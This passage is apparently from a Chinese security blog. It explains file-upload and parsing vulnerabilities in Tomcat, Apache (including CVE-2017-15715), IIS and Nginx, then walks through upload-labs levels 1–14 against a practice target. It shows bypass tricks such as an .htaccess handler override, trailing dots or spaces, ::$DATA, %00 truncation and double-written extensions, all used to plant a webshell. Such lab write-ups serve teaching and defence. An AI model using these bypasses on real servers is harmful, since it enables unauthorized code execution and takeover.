alt="image-20220217224530062"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>根据漏洞原理，方式readonly为false时，使用PUT方式可对服务器写入文件；</p><p>利用PUT方式请求创建文件：</p><p><img src="/2022/02/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/image-20220218003341484.png" alt="image-20220218003341484"></p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>再次请求1.jsp文件，访问成功；这里<code>shell</code>只是表达一个含义：可以写入JSP后门代码，最后使用后门工具进行控制。<br><img src="/2022/02/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/image-20220218003503775.png" alt="image-20220218003503775"></p><hr><h2 id="Apache未知扩展名解析漏洞"><a href="#Apache未知扩展名解析漏洞" class="headerlink" title="Apache未知扩展名解析漏洞"></a>Apache未知扩展名解析漏洞</h2><h3 id="0x00-未知扩展名解析漏洞"><a href="#0x00-未知扩展名解析漏洞" class="headerlink" title="0x00 未知扩展名解析漏洞"></a>0x00 未知扩展名解析漏洞</h3><p>Apache的解析漏洞依赖于一个特性：<strong>Apache默认</strong>一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在<strong>mime.types</strong>文件内），则继续向左识别，直到识别到合法后缀才进行解析。</p><p>例：x.php.xxx.yyy</p><p>先识别最后的yyy，如果不识别，向前解析，直到识别到php</p><h3 id="0x01-漏洞利用场景"><a href="#0x01-漏洞利用场景" class="headerlink" title="0x01 漏洞利用场景"></a>0x01 漏洞利用场景</h3><p>如果对方中间件Apache属于低版本，我们可以利用文件上传，上传一个不识别的文件后缀，利用解析漏洞规则成功解析文件，然后将写入其中的后门代码触发。</p><p>##Apache HTTPD 多后缀解析漏洞</p><p>###0x00 漏洞复现</p><p>访问这个地址先进行文件上传，上传test.php.jpg文件：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;靶机IP&#x2F;uploadfiles&#x2F;index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/image-20220217235146226.png" alt="image-20220217235146226"></p><p>可以看到上传的文件路径：<br><img src="/2022/02/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/image-20220217235218835.png" alt="image-20220217235218835"></p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>按照路径访问文件，成功解析出其中的后门代码：</p><p><img src="/2022/02/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/image-20220217235251664.png" alt="image-20220217235251664"></p><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>由于<code>http://靶机IP/index.php</code>中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为<code>xxx.php.jpg</code>或<code>xxx.php.jpeg</code>的文件，利用Apache解析漏洞进行getshell。</p><h2 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h2><h3 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00 原理"></a>0x00 原理</h3><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。<strong>其2.4.0~2.4.29版本</strong>中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><h3 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h3><p>启动靶场环境：</p><p><img src="/2022/02/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/image-20220218001107559.png" alt="image-20220218001107559"></p><h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h3><p>上传一个1.php文件，可以看到返回结果错误：</p><p><img src="/2022/02/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/image-20220218001249309.png" alt="image-20220218001249309"></p><p><img src="/2022/02/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/image-20220218001327227.png" alt="image-20220218001327227"></p><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>在1.php后面插入一个<code>\x0A</code>，可以看到上传文件成功：<br><img src="/2022/02/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/image-20220218004948163.png" alt="image-20220218004948163"></p><p><img src="/2022/02/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/image-20220218005046867.png" alt="image-20220218005046867"></p><h3 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h3><p>访问文件，成功解析：由于文件不是php后缀，说明目标存在解析漏洞。</p><p><img src="/2022/02/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/image-20220218005121082.png" alt="image-20220218005121082"></p><h2 id="IIS和Nginx解析漏洞"><a href="#IIS和Nginx解析漏洞" class="headerlink" title="IIS和Nginx解析漏洞"></a>IIS和Nginx解析漏洞</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问一张图片地址，后面增加<code>/.php</code>，图片文件被解为php文件，执行后门代码。</p><p><strong>Nginx配置文件错误导致的解析漏洞</strong>：</p><p>对于任意文件名，在后面添加&#x2F;xxx.php（xxx为任意字符）后,即可将文件作为php解析。</p><p>**IIS 6.x **</p><p><strong>基于文件名</strong>：</p><p>该版本 默认会将 *.asp;.jpg 此种格式的文件名，当成Asp解析，原理是 服务器默认不解析; 号及其后面的内容，相当于截断。</p><p><strong>基于文件夹名</strong> ：</p><p>该版本 默认会将 *.asp&#x2F;目录下的所有文件当成Asp解析。</p><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>随便访问网站的图片地址，后面增加<code>/.php</code>，若出现错误，则无解析漏洞，若非错误提示，则存在此解析漏洞，后续只需寻找一个上传点即可获取权限。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>还有<strong>Nginx 文件名逻辑漏洞（CVE-2013-4547）</strong>等。</p><p>参考文章：<br><a href="https://blog.werner.wiki/file-resolution-vulnerability-nginx/">https://blog.werner.wiki/file-resolution-vulnerability-nginx/</a></p>]]></content>
      
      
      <categories>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传-upload-labs</title>
      <link href="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/"/>
      <url>/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Pass-01（前端JS绕过）"><a href="#Pass-01（前端JS绕过）" class="headerlink" title="Pass-01（前端JS绕过）"></a>Pass-01（前端JS绕过）</h1><h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>首先分析一下源码：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214141754993.png" alt="image-20220214141754993"></p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214142036372.png" alt="image-20220214142036372"></p><p><code>$_FILES</code>：PHP中的<code>$_FILES</code> 是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。如果为单个文件上传，那么 <code>$_FILES</code> 为二维数组；如果为多个文件上传，那么 $_FILES 为三维数组。</p><p><code>move_uploaded_file()</code> 函数：把上传的文件移动到新位置。</p><p>通过源码可以看到这是前端验证，一般前端验证都是纸老虎。</p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>这关有三种方式：浏览器禁用JS，抓包，本地修改源码。</p><p>####禁用JS</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214144628824.png" alt="image-20220214144628824"></p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214145044601.png" alt="image-20220214145044601"></p><p>可以看到禁用JS后1.php文件已上传，但<strong>实战中这种方式并不推荐</strong>，实战中其他的JS文件可能会有其他功能，禁用JS会导致其他功能的失败，达不到想要的效果。</p><p>访问上传的文件：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214150424977.png" alt="image-20220214150424977"></p><p>####抓包</p><p>修改文件后缀：</p><p>修改前：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214151040800.png" alt="image-20220214151040800"></p><p>修改后进行放包：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214151109932.png" alt="image-20220214151109932"></p><p>可以看到文件已上传4.php：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214151321338.png" alt="image-20220214151321338"></p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214151234108.png" alt="image-20220214151234108"></p><p>访问4.php文件，jpg格式被解析成php格式执行，之后执行了恶意语句：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214151626302.png" alt="image-20220214151626302"></p><h4 id="本地修改源码"><a href="#本地修改源码" class="headerlink" title="本地修改源码"></a>本地修改源码</h4><p>右键查看源代码删除JS代码修改文件后缀名为html：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214152332406.png" alt="image-20220214152332406"></p><p>由于上传文件是要上传给服务器，但此时复制出来的源码没有上传路径，此时就要打开浏览器：右键-&gt;检查-&gt;网络-&gt;上传正常的图片-&gt;找到POST请求的上传路径复制下来-&gt;填到<code>action</code>字段后面：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214152827556.png" alt="image-20220214152827556"></p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214152931931.png" alt="image-20220214152931931"></p><p>接下来上传文件即可：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214153125343.png" alt="image-20220214153125343"></p><p>5.php文件已被上传：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214153141232.png" alt="image-20220214153141232"></p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214153456644.png" alt="image-20220214153456644"></p><h1 id="Pass-02（MME绕过）"><a href="#Pass-02（MME绕过）" class="headerlink" title="Pass-02（MME绕过）"></a>Pass-02（MME绕过）</h1><p>源码分析：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214154048267.png" alt="image-20220214154048267"></p><p>由于源码中有<code>type</code>字段，可见这关是常见验证中的文件类型验证，也就是验证MIME信息，因此，思路就是抓包将<code>Content-Type</code>修改为允许上传的类型（image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif）三选一。</p><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p>将<code>application/octet-stream</code>字段修改为可允许通过的类型：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214154700738.png" alt="image-20220214154700738"></p><p>###0x01</p><p>这里选择jpg类型：image&#x2F;jpeg</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214155027552.png" alt="image-20220214155027552"></p><p>（这里记得将文件名修改一下，因为服务器不允许相同文件名存在）</p><p>###0x02</p><p>文件已上传：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214155154137.png" alt="image-20220214155154137"></p><h1 id="Pass-03（上传特殊解析后缀绕过）"><a href="#Pass-03（上传特殊解析后缀绕过）" class="headerlink" title="Pass-03（上传特殊解析后缀绕过）"></a>Pass-03（上传特殊解析后缀绕过）</h1><h3 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h3><p>看源码，黑名单验证：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214155726191.png" alt="image-20220214155726191"></p><p>先了解下函数：</p><p>$deny_ext：不允许通过的文件后缀</p><p>trim()函数： 函数移除字符串两侧的空白字符或其他预定义字符。</p><p>deldot()函数：删除文件名末尾的点</p><p><code>::$DATA</code> ：在window的时候如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名。</p><p>例如:<code>&quot;phpinfo.php::$DATA&quot;</code>Windows会自动去掉末尾的<code>::$DATA</code>变成<code>&quot;phpinfo.php&quot;</code></p><p>整个源码：将上传的文件先用trim()函数去掉文件名和后缀名两侧的空格（这是由于抓到数据包之后文件的名字和后缀名可添加空格进行执行），同样deldot()函数也是同理。</p><p>利用黑名单缺陷：<strong>黑名单验证若是黑名单定义不完整的话是可以实现绕过的，用.phtml，.php，.php5，.pht进行绕过。</strong></p><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>这里将6.php修改为6.php5：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214163208715.png" alt="image-20220214163208715"></p><p>可以看到文件已上传：（这里上传上去文件名会改变）</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215003319602.png" alt="image-20220215003319602"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>访问文件：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215003854950.png" alt="image-20220215003854950"></p><p>这里如果要访问6.php5文件的话必须修改Apache配置文件，将一下注释符去掉：</p><pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .php .phtml .phps .php5 .pht<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Pass-04（上传-htaccess）"><a href="#Pass-04（上传-htaccess）" class="headerlink" title="Pass-04（上传.htaccess）"></a>Pass-04（上传.htaccess）</h1><h3 id="0x00-3"><a href="#0x00-3" class="headerlink" title="0x00"></a>0x00</h3><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214165628833.png" alt="image-20220214165628833"></p><p>这关和上一关最大的区别 就是黑名单添加的更多了。这种情况，尝试上传一个<code>.htaccess</code>配置文件。创建.htaccess文件内容写：</p><pre class="line-numbers language-none"><code class="language-none">&lt;FilesMatch &quot;2&quot;&gt;Sethandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch &gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时，访问2.jpg文件即可。</p><p>可以看到上传成功：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214170552577.png" alt="image-20220214170552577"></p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>.htaccess文件不能起名字，它就是.htaccess文件，如果将它改为4.htaccess或者其他的什么名字是不可以的，无法解析。在实战中有可能上传上去这个文件会被自动重命名，被重命名了就不可以了。</p><p>#Pass-05（点和空格绕过）</p><h3 id="0x00-4"><a href="#0x00-4" class="headerlink" title="0x00"></a>0x00</h3><p>源码分析，这关将<code>.htaccess</code>后缀名拉入了黑名单，而且源码中对于删除末尾的点和收尾去空的操作只进行了一次过滤。<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214223114234.png" alt="image-20220214223114234"></p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214223528242.png" alt="image-20220214223528242"></p><p><strong>思路：</strong>因此将数据包中的<code>.php</code>改成<code>.php. .</code>，由于它会先检查文件名末尾的点，然后再去空，但只检查一次，还是会留下一个<code>.</code>形成<code>.php.</code>这时候就进行了绕过。</p><p>（但如果这里使用循环的话，这个方法是不可行的）</p><h3 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h3><p>抓包，将<code>6.php</code>改为<code>9.php. .</code>:<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214224343252.png" alt="image-20220214224343252"></p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214235003901.png" alt="image-20220214235003901"></p><p>###0x02</p><p>可以看到9.php文件已经被上传：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214235034287.png" alt="image-20220214235034287"></p><p>###0x03</p><p>访问9.php：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214235517954.png" alt="image-20220214235517954"></p><p>#Pass-06（大小写绕过）</p><h3 id="0x00-5"><a href="#0x00-5" class="headerlink" title="0x00"></a>0x00</h3><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220214235653409.png" alt="image-20220214235653409"></p><p>源码中将大小写转换一行去掉了，也就是说没有进行大小写转换。</p><p><strong>思路：</strong>那这里可以使用大写或者大小写混合进行绕过。</p><h3 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h3><p>上传1.php，修改为大小写混合：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215000032391.png" alt="image-20220215000032391"></p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215000228486.png" alt="image-20220215000228486"></p><p>###0x02</p><p>可以看到已上传，这里文件名会被自动修改：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215000208080.png" alt="image-20220215000208080"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>访问1.php：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215004739422.png" alt="image-20220215004739422"></p><h1 id="Pass-07（空格绕过）"><a href="#Pass-07（空格绕过）" class="headerlink" title="Pass-07（空格绕过）"></a>Pass-07（空格绕过）</h1><p>源码可以看到，去空一行没有了，那这关抓包在后缀名后面添加空格即可。</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215001921553.png" alt="image-20220215001921553"></p><h3 id="0x00-6"><a href="#0x00-6" class="headerlink" title="0x00"></a>0x00</h3><p>上传6.php文件，后缀名加空格：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215004927112.png" alt="image-20220215004927112"></p><p>###0x01</p><p>文件已上传：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215005038895.png" alt="image-20220215005038895"></p><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>访问文件：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215005250961.png" alt="image-20220215005250961"></p><h1 id="Pass-08（点绕过）"><a href="#Pass-08（点绕过）" class="headerlink" title="Pass-08（点绕过）"></a>Pass-08（点绕过）</h1><p>源码将删除末尾的点一行去掉了，这关思路就是<strong>抓包加点</strong>：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215005448407.png" alt="image-20220215005448407"></p><h3 id="0x00-7"><a href="#0x00-7" class="headerlink" title="0x00"></a>0x00</h3><p>改包：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215005709872.png" alt="image-20220215005709872"></p><h3 id="0x01-4"><a href="#0x01-4" class="headerlink" title="0x01"></a>0x01</h3><p>文件已上传：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215005646852.png" alt="image-20220215005646852"></p><h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h3><p>访问文件：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215005813075.png" alt="image-20220215005813075"></p><h1 id="Pass-09（-DATA绕过）"><a href="#Pass-09（-DATA绕过）" class="headerlink" title="Pass-09（::$DATA绕过）"></a>Pass-09（::$DATA绕过）</h1><h3 id="0x00-8"><a href="#0x00-8" class="headerlink" title="0x00"></a>0x00</h3><p>源码将<code>字符串::$DATA</code>一行去掉，这里直接加上<code>字符串::$DATA</code>上传。</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215010428901.png" alt="image-20220215010428901"></p><h3 id="0x01-5"><a href="#0x01-5" class="headerlink" title="0x01"></a>0x01</h3><p>抓包改包：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215010709048.png" alt="image-20220215010709048"></p><h3 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h3><p>访问文件：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215010801698.png" alt="image-20220215010801698"></p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215010831109.png" alt="image-20220215010831109"></p><h1 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h1><h3 id="0x00-9"><a href="#0x00-9" class="headerlink" title="0x00"></a>0x00</h3><p>和第5关相同</p><h1 id="Pass-11（双写绕过）"><a href="#Pass-11（双写绕过）" class="headerlink" title="Pass-11（双写绕过）"></a>Pass-11（双写绕过）</h1><h3 id="0x00-10"><a href="#0x00-10" class="headerlink" title="0x00"></a>0x00</h3><p>看到源码把那几行过滤的代码都去掉了，就试着随便上传了一下：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215011433956.png" alt="image-20220215011433956"></p><p>可以看到，直接把后缀名过滤了：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215011549187.png" alt="image-20220215011549187"></p><p>那这里应该就是不允许使用.php后缀的文件，直接双写绕过。</p><h3 id="0x01-6"><a href="#0x01-6" class="headerlink" title="0x01"></a>0x01</h3><p>抓包改包：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215011713862.png" alt="image-20220215011713862"></p><h3 id="0x02-4"><a href="#0x02-4" class="headerlink" title="0x02"></a>0x02</h3><p>绕过成功：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215011739154.png" alt="image-20220215011739154"></p><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>访问文件：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215011854229.png" alt="image-20220215011854229"></p><h2 id="Pass-02–Pass-11总结"><a href="#Pass-02–Pass-11总结" class="headerlink" title="Pass-02–Pass-11总结"></a>Pass-02–Pass-11总结</h2><p>以上这几关都是黑名单绕过，而且过滤语句没有涉及循环，都是验证一次，理解每一关的思路，了解每一关方法是重点。</p><h1 id="Pass-12（-00截断）"><a href="#Pass-12（-00截断）" class="headerlink" title="Pass-12（%00截断）"></a>Pass-12（%00截断）</h1><h3 id="0x00-11"><a href="#0x00-11" class="headerlink" title="0x00"></a>0x00</h3><p>白名单验证：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215012011212.png" alt="image-20220215012011212"></p><p>涉及函数：<br>PHP strrpos() 函数：查找字符串在另一字符串中最后一次出现的位置。</p><p>这里就是：查找<strong>文件名后缀</strong>在字符串中最后一次出现的位置</p><p>源码中可以看到文件路径是可以控制的，那这里通过<code>%00进行截断</code>上传文件。由于是<code>get方式</code>进行提交，所以直接填<code>%00</code>即可，因为<code>get方式</code>会自动编码，而<code>post方式</code>需要手动转换。</p><p><strong>注意：%00只能用于php版本低于5.3的</strong></p><h3 id="0x01-7"><a href="#0x01-7" class="headerlink" title="0x01"></a>0x01</h3><p>%00截断：<br>在<strong>url中%00表示ascll码中的0</strong> ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。</p><p>###0x02</p><p>源码中post方式提交的路径是图片目录，这里直接提交<code>10.php%00</code>，可以看到上传的文件10.php。</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215163828205.png" alt="image-20220215163828205"></p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215163206878.png" alt="image-20220215163206878"></p><p><strong>原因：这是由于文件名拼接目录名之后再进行php后缀的验证，而此时10.php文件后存在%00进行截断，就不会拼接后面的4.jpg文件，就认为是10.php文件，就完成了绕过。</strong></p><h3 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h3><p>访问文件：<br><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215165244220.png" alt="image-20220215165244220"></p><h1 id="Pass-13（POST-00截断）"><a href="#Pass-13（POST-00截断）" class="headerlink" title="Pass-13（POST%00截断）"></a>Pass-13（POST%00截断）</h1><h3 id="0x00-12"><a href="#0x00-12" class="headerlink" title="0x00"></a>0x00</h3><p>这关提交方式是post，那这里<code>%00</code>就需要手动编码。</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215170108170.png" alt="image-20220215170108170"></p><h3 id="0x01-8"><a href="#0x01-8" class="headerlink" title="0x01"></a>0x01</h3><p>手动编码：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215170758285.png" alt="image-20220215170758285"></p><h3 id="0x02-5"><a href="#0x02-5" class="headerlink" title="0x02"></a>0x02</h3><p>可以看到2.php文件已上传：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215170915245.png" alt="image-20220215170915245"></p><h3 id="0x03-3"><a href="#0x03-3" class="headerlink" title="0x03"></a>0x03</h3><p>访问文件：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215171124398.png" alt="image-20220215171124398"></p><h1 id="Pass-14（图片马绕过）"><a href="#Pass-14（图片马绕过）" class="headerlink" title="Pass-14（图片马绕过）"></a>Pass-14（图片马绕过）</h1><h3 id="0x00-13"><a href="#0x00-13" class="headerlink" title="0x00"></a>0x00</h3><p>源码分析：</p><p><img src="/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/image-20220215171312458.png" 